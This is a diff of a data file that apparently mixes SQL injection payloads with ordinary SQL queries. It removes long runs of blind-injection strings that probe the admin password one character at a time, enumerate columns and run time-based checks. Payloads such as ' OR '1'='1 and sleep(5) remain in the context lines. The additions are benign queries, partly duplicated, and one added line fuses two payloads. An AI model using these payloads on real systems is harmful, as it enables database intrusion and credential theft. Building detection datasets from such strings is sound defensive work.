@@ -754,15 +754,6 @@ UPDATE user_preferences SET preference = 'SMS Notifications
 ' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 0 --
 ' AND 1=1 LIMIT 1; --
 ' AND 1=1 ORDER BY 1 --
-' AND 1=1 ORDER BY 2 --
-' AND 1=1 ORDER BY 3 --
-' AND 1=1 ORDER BY 4 --
-' AND 1=1 ORDER BY 5 --
-' AND 1=1 ORDER BY 6 --
-' AND 1=1 ORDER BY 7 --
-' AND 1=1 ORDER BY 8 --
-' AND 1=1 ORDER BY 9 --
-' AND 1=1 ORDER BY 10 --
 ' AND 1=1 GROUP BY CONCAT(username, password) HAVING 1=1 --
 ' AND 1=1 GROUP BY username HAVING 1=1 --
 ' AND 1=1 GROUP BY password HAVING 1=1 --
@@ -773,43 +764,6 @@ UPDATE user_preferences SET preference = 'SMS Notifications
 ' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0 --
 ' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE username='admin')='a' --
 ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='b' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='c' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='d' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='e' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='f' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='g' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='h' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='i' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='j' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='k' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='l' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='m' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='n' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='o' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='p' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='q' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='r' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='s' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='t' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='u' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='v' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='w' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='x' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='y' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='z' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='0' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='1' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='2' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='3' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='4' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='5' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='6' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='7' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='8' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='9' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')=' '` --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='~' --
 ' OR '1'='1
 ' OR '1'='1' --
 ' OR '1'='1' /*
@@ -832,15 +786,6 @@ UPDATE user_preferences SET preference = 'SMS Notifications
 ' AND (SELECT LENGTH(password) FROM users WHERE username='admin') > 0 --
 ' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 0 --
 ' AND 1=1 LIMIT 1; --
-' AND 1=1 ORDER BY 1 --
-' AND 1=1 ORDER BY 2 --
-' AND 1=1 ORDER BY 3 --
-' AND 1=1 ORDER BY 4 --
-' AND 1=1 ORDER BY 5 --
-' AND 1=1 ORDER BY 6 --
-' AND 1=1 ORDER BY 7 --
-' AND 1=1 ORDER BY 8 --
-' AND 1=1 ORDER BY 9 --
 ' AND 1=1 ORDER BY 10 --
 ' AND 1=1 GROUP BY CONCAT(username, password) HAVING 1=1 --
 ' AND 1=1 GROUP BY username HAVING 1=1 --
@@ -852,150 +797,6 @@ UPDATE user_preferences SET preference = 'SMS Notifications
 ' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0 --
 ' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE username='admin')='a' --
 ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='b' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='c' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='d' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='e' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='f' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='g' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='h' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='i' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='j' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='k' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='l' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='m' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='n' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='o' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='p' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='q' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='r' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='s' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='t' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='u' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='v' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='w' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='x' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='y' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='z' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='0' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='1' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='2' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='3' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='4' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='5' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='6' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='7' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='8' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='9' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')=' '` --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='~' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='!' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='@' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='#' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='$' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='%' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='^' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='&' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='*' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='(' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')=')' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='-' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='_' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='+' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='=' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='{' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='}' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='[' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')=']' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')=':' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')=';' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='"' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')=',' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='.' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='<' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='>' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='/' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='?' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='`' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='|' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='\\' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='\"' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')=' ' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='0' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='1' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='2' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='3' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='4' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='5' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='6' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='7' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='8' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='9' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')=' '` --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='~' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='!' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='@' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='#' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='$' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='%' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='^' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='&' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='*' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='(' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')=')' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='-' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='_' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='+' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='=' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='{' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='}' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='[' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')=']' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')=':' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')=';' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='"' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')=',' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='.' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='<' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='>' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='/' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='?' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='`' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='|' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='\\' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='\"' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')=' ' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='0' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='1' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='2' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='3' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='4' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='5' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='6' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='7' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='8' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='9' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')=' '` --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='~' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='!' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='@' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='#' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='$' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='%' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='^' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='&' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='*' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='(' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')=')' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='-' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='_' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='+' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='=' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='{' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='}' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='[' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')=']' --
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')=':' --
 OR 1=1
 OR 1=0
 OR x=x
@@ -1025,13 +826,7 @@ AND 1=0#
 AND 1=1 AND '%'='
 AND 1=0 AND '%'='
 AND 1083=1083 AND (1427=1427
-AND 7506=9091 AND (5913=5913
-AND 1083=1083 AND ('1427=1427
-AND 7506=9091 AND ('5913=5913
-AND 7300=7300 AND 'pKlZ'='pKlZ
-AND 7300=7300 AND 'pKlZ'='pKlY
-AND 7300=7300 AND ('pKlZ'='pKlZ
-AND 7300=7300 AND ('pKlZ'='pKlY
+AND 7506=9091 AND (5913=5913AND 7300=7300 AND ('pKlZ'='pKlY
 AS INJECTX WHERE 1=1 AND 1=1
 AS INJECTX WHERE 1=1 AND 1=0
 AS INJECTX WHERE 1=1 AND 1=1#
@@ -1045,111 +840,15 @@ WHERE 1=1 AND 1=0#
 WHERE 1=1 AND 1=1--
 WHERE 1=1 AND 1=0--
 ORDER BY 1-- 
-ORDER BY 2-- 
-ORDER BY 3-- 
-ORDER BY 4-- 
-ORDER BY 5-- 
-ORDER BY 6-- 
-ORDER BY 7-- 
-ORDER BY 8-- 
-ORDER BY 9-- 
-ORDER BY 10-- 
-ORDER BY 11-- 
-ORDER BY 12-- 
-ORDER BY 13-- 
-ORDER BY 14-- 
-ORDER BY 15-- 
-ORDER BY 16-- 
-ORDER BY 17-- 
-ORDER BY 18-- 
-ORDER BY 19-- 
-ORDER BY 20-- 
-ORDER BY 21-- 
-ORDER BY 22-- 
-ORDER BY 23-- 
-ORDER BY 24-- 
-ORDER BY 25-- 
-ORDER BY 26-- 
-ORDER BY 27-- 
-ORDER BY 28-- 
-ORDER BY 29-- 
-ORDER BY 30-- 
-ORDER BY 31337-- 
-ORDER BY 1# 
-ORDER BY 2# 
-ORDER BY 3# 
-ORDER BY 4# 
-ORDER BY 5# 
-ORDER BY 6# 
-ORDER BY 7# 
-ORDER BY 8# 
-ORDER BY 9# 
-ORDER BY 10# 
-ORDER BY 11# 
-ORDER BY 12# 
-ORDER BY 13# 
-ORDER BY 14# 
-ORDER BY 15# 
-ORDER BY 16# 
-ORDER BY 17# 
-ORDER BY 18# 
-ORDER BY 19# 
-ORDER BY 20# 
-ORDER BY 21# 
-ORDER BY 22# 
-ORDER BY 23# 
-ORDER BY 24# 
-ORDER BY 25# 
-ORDER BY 26# 
-ORDER BY 27# 
-ORDER BY 28# 
-ORDER BY 29# 
-ORDER BY 30#
-ORDER BY 31337#
-ORDER BY 1 
-ORDER BY 2 
-ORDER BY 3 
-ORDER BY 4 
-ORDER BY 5 
-ORDER BY 6 
-ORDER BY 7 
-ORDER BY 8 
-ORDER BY 9 
-ORDER BY 10 
-ORDER BY 11 
-ORDER BY 12 
-ORDER BY 13 
-ORDER BY 14 
-ORDER BY 15 
-ORDER BY 16 
-ORDER BY 17 
-ORDER BY 18 
-ORDER BY 19 
-ORDER BY 20 
-ORDER BY 21 
-ORDER BY 22 
-ORDER BY 23 
-ORDER BY 24 
-ORDER BY 25 
-ORDER BY 26 
-ORDER BY 27 
-ORDER BY 28 
 ORDER BY 29 
 ORDER BY 30 
 ORDER BY 31337 
-RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
 RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
 IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--
 IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
 %' AND 8310=8310 AND '%'='
 %' AND 8310=8311 AND '%'='
 and (select substring(@@version,1,1))='X'
-and (select substring(@@version,1,1))='M'
-and (select substring(@@version,2,1))='i'
-and (select substring(@@version,2,1))='y'
-and (select substring(@@version,3,1))='c'
-and (select substring(@@version,3,1))='S'
-and (select substring(@@version,3,1))='X'
 sleep(5)#
 1 or sleep(5)#
 " or sleep(5)#
@@ -1171,13 +870,6 @@ sleep(5)#
 benchmark(10000000,MD5(1))#
 1 or benchmark(10000000,MD5(1))#
 " or benchmark(10000000,MD5(1))#
-' or benchmark(10000000,MD5(1))#
-1) or benchmark(10000000,MD5(1))#
-") or benchmark(10000000,MD5(1))#
-') or benchmark(10000000,MD5(1))#
-1)) or benchmark(10000000,MD5(1))#
-")) or benchmark(10000000,MD5(1))#
-')) or benchmark(10000000,MD5(1))#
 pg_sleep(5)--
 1 or pg_sleep(5)--
 " or pg_sleep(5)--
@@ -1890,3 +1582,601 @@ SELECT e.first_name, e.last_name, d.name AS department_name FROM employees e JOI
 SELECT p.name, COUNT(oi.product_id) AS sold_count FROM products p JOIN order_items oi ON p.id = oi.product_id WHERE oi.order_id IN (SELECT id FROM orders WHERE order_date >= '2023-01-01') GROUP BY p.name;
 SELECT c.name, SUM(o.total) AS total_spent FROM customers c JOIN orders o ON c.id = o.customer_id GROUP BY c.name HAVING total_spent > 1000;
 SELECT e.first_name, e.last_name, COUNT(o.id) AS orders_handled FROM employees e LEFT JOIN orders o ON e.id = o.employee_id GROUP BY e.id HAVING orders_handled > 10;
+SELECT * FROM Employees;
+SELECT EmployeeID, FirstName, LastName FROM Employees WHERE Department = 'HR';
+SELECT ProductID, ProductName, Price FROM Products ORDER BY Price DESC LIMIT 10;
+SELECT o.OrderID, e.FirstName, e.LastName, p.ProductName FROM Orders o JOIN Employees e ON o.EmployeeID = e.EmployeeID JOIN Products p ON o.ProductID = p.ProductID;
+SELECT Department, COUNT(*) AS EmployeeCount FROM Employees GROUP BY Department;
+SELECT AVG(Salary) AS AverageSalary FROM Employees WHERE Department = 'Engineering';
+SELECT Department, MAX(Salary) AS HighestSalary FROM Employees GROUP BY Department HAVING MAX(Salary) > 100000;
+SELECT * FROM Projects WHERE ProjectName LIKE '%AI%';
+SELECT ProjectID, ProjectName, StartDate FROM Projects WHERE StartDate BETWEEN '2022-01-01' AND '2022-12-31';
+INSERT INTO Projects (ProjectName, StartDate, EndDate) VALUES ('New Project', '2023-01-01', '2023-12-31');
+UPDATE Employees SET Salary = Salary * 1.10 WHERE Department = 'Sales';
+DELETE FROM Logs WHERE LogDate < DATE_SUB(CURDATE(), INTERVAL 1 YEAR);
+ALTER TABLE Employees ADD COLUMN MiddleName VARCHAR(50);
+CREATE TABLE Departments (DepartmentID INT PRIMARY KEY AUTO_INCREMENT, DepartmentName VARCHAR(50));
+ALTER TABLE Projects MODIFY COLUMN ProjectName VARCHAR(100);
+DROP TABLE TempData;
+GRANT SELECT, INSERT, UPDATE ON Projects TO user1;
+REVOKE DELETE ON Employees FROM user2;
+CREATE USER 'new_user' IDENTIFIED BY 'secure_password';
+ALTER USER 'admin' RENAME TO 'super_admin';
+BEGIN TRANSACTION; UPDATE Inventory SET Quantity = Quantity - 1 WHERE ProductID = 123; COMMIT;
+CREATE INDEX idx_project_name ON Projects(ProjectName);
+BACKUP DATABASE CompanyDB TO 'backup.sql';
+SELECT ProjectID, ProjectName FROM Projects WHERE ProjectID IN (SELECT ProjectID FROM Tasks WHERE Status = 'Completed');
+SELECT e.EmployeeID, e.FirstName, e.LastName, p.ProjectName FROM Employees e LEFT JOIN Projects p ON e.EmployeeID = p.ManagerID WHERE p.ProjectID IS NULL;
+SELECT Department, COUNT(*) AS EmployeeCount FROM Employees GROUP BY Department HAVING COUNT(*) > 10;
+WITH SalesCTE AS (SELECT ProductID, SUM(Quantity) AS TotalSales FROM Sales GROUP BY ProductID) SELECT p.ProductName, s.TotalSales FROM Products p JOIN SalesCTE s ON p.ProductID = s.ProductID;
+SELECT EmployeeID, Salary, RANK() OVER (ORDER BY Salary DESC) AS SalaryRank FROM Employees;
+WITH RECURSIVE OrgChart AS (SELECT EmployeeID, ManagerID, FirstName, LastName FROM Employees WHERE ManagerID IS NULL UNION ALL SELECT e.EmployeeID, e.ManagerID, e.FirstName, e.LastName FROM Employees e INNER JOIN OrgChart o ON e.ManagerID = o.EmployeeID) SELECT * FROM OrgChart;
+SELECT JSON_VALUE(EmployeeInfo, '$.Name') AS EmployeeName FROM Employees WHERE JSON_VALUE(EmployeeInfo, '$.Department') = 'Finance';
+SELECT EmployeeName, CAST(EmployeeDetails AS XML).value('(/Employee/City)[1]', 'VARCHAR(50)') AS City FROM Employees;
+SELECT * FROM Employees;
+SELECT EmployeeID, FirstName, LastName FROM Employees WHERE Department = 'HR';
+SELECT ProductID, ProductName, Price FROM Products ORDER BY Price DESC LIMIT 10;
+SELECT o.OrderID, e.FirstName, e.LastName, p.ProductName FROM Orders o JOIN Employees e ON o.EmployeeID = e.EmployeeID JOIN Products p ON o.ProductID = p.ProductID;
+SELECT Department, COUNT(*) AS EmployeeCount FROM Employees GROUP BY Department;
+SELECT AVG(Salary) AS AverageSalary FROM Employees WHERE Department = 'Engineering';
+SELECT Department, MAX(Salary) AS HighestSalary FROM Employees GROUP BY Department HAVING MAX(Salary) > 100000;
+SELECT * FROM Projects WHERE ProjectName LIKE '%AI%';
+SELECT ProjectID, ProjectName, StartDate FROM Projects WHERE StartDate BETWEEN '2022-01-01' AND '2022-12-31';
+INSERT INTO Projects (ProjectName, StartDate, EndDate) VALUES ('New Project', '2023-01-01', '2023-12-31');
+UPDATE Employees SET Salary = Salary * 1.10 WHERE Department = 'Sales';
+DELETE FROM Logs WHERE LogDate < DATE_SUB(CURDATE(), INTERVAL 1 YEAR);
+ALTER TABLE Employees ADD COLUMN MiddleName VARCHAR(50);
+CREATE TABLE Departments (DepartmentID INT PRIMARY KEY AUTO_INCREMENT, DepartmentName VARCHAR(50));
+ALTER TABLE Projects MODIFY COLUMN ProjectName VARCHAR(100);
+DROP TABLE TempData;
+GRANT SELECT, INSERT, UPDATE ON Projects TO user1;
+REVOKE DELETE ON Employees FROM user;
+CREATE USER 'new_user' IDENTIFIED BY 'secure_password';
+ALTER USER 'admin' RENAME TO 'super_admin';
+BEGIN TRANSACTION; UPDATE Inventory SET Quantity = Quantity - 1 WHERE ProductID = 123; COMMIT;
+CREATE INDEX idx_project_name ON Projects(ProjectName);
+BACKUP DATABASE CompanyDB TO 'backup.sql';
+SELECT ProjectID, ProjectName FROM Projects WHERE ProjectID IN (SELECT ProjectID FROM Tasks WHERE Status = 'Completed');
+SELECT e.EmployeeID, e.FirstName, e.LastName, p.ProjectName FROM Employees e LEFT JOIN Projects p ON e.EmployeeID = p.ManagerID WHERE p.ProjectID IS NULL;
+SELECT Department, COUNT(*) AS EmployeeCount FROM Employees GROUP BY Department HAVING COUNT(*) > 10;
+WITH SalesCTE AS (SELECT ProductID, SUM(Quantity) AS TotalSales FROM Sales GROUP BY ProductID) SELECT p.ProductName, s.TotalSales FROM Products p JOIN SalesCTE s ON p.ProductID = s.ProductID;
+SELECT EmployeeID, Salary, RANK() OVER (ORDER BY Salary DESC) AS SalaryRank FROM Employees;
+WITH RECURSIVE OrgChart AS (SELECT EmployeeID, ManagerID, FirstName, LastName FROM Employees WHERE ManagerID IS NULL UNION ALL SELECT e.EmployeeID, e.ManagerID, e.FirstName, e.LastName FROM Employees e INNER JOIN OrgChart o ON e.ManagerID = o.EmployeeID) SELECT * FROM OrgChart;
+SELECT JSON_VALUE(EmployeeInfo, '$.Name') AS EmployeeName FROM Employees WHERE JSON_VALUE(EmployeeInfo, '$.Department') = 'Finance';
+SELECT EmployeeName, CAST(EmployeeDetails AS XML).value('(/Employee/City)[1]', 'VARCHAR(50)') AS City FROM Employees;
+SELECT * FROM Sales WHERE SaleDate = CURDATE();
+SELECT ProductID, SUM(Quantity) AS TotalQuantity FROM Sales GROUP BY ProductID;
+SELECT EmployeeID, FirstName, LastName FROM Employees WHERE HireDate > '2020-01-01';
+SELECT Department, AVG(Salary) AS AverageSalary FROM Employees GROUP BY Department;
+SELECT * FROM Customers WHERE Country = 'USA';
+SELECT OrderID, OrderDate, CustomerID FROM Orders WHERE OrderAmount > 500;
+INSERT INTO Employees (FirstName, LastName, Department, Salary) VALUES ('John', 'Doe', 'IT', 60000);
+UPDATE Customers SET City = 'New York' WHERE CustomerID = 123;
+DELETE FROM Orders WHERE OrderID = 456;
+ALTER TABLE Products ADD COLUMN Stock INT DEFAULT 0;
+CREATE TABLE Suppliers (SupplierID INT PRIMARY KEY AUTO_INCREMENT, SupplierName VARCHAR(50), ContactName VARCHAR(50));
+ALTER TABLE Employees DROP COLUMN MiddleName;
+DROP TABLE OldRecords;
+GRANT SELECT, UPDATE ON Employees TO user2;
+REVOKE INSERT ON Orders FROM user3;
+CREATE USER 'backup_user' IDENTIFIED BY 'backup_password';
+ALTER USER 'guest' RENAME TO 'visitor';
+BEGIN TRANSACTION; INSERT INTO Inventory (ProductID, Quantity) VALUES (789, 100); COMMIT;
+CREATE INDEX idx_order_date ON Orders(OrderDate);
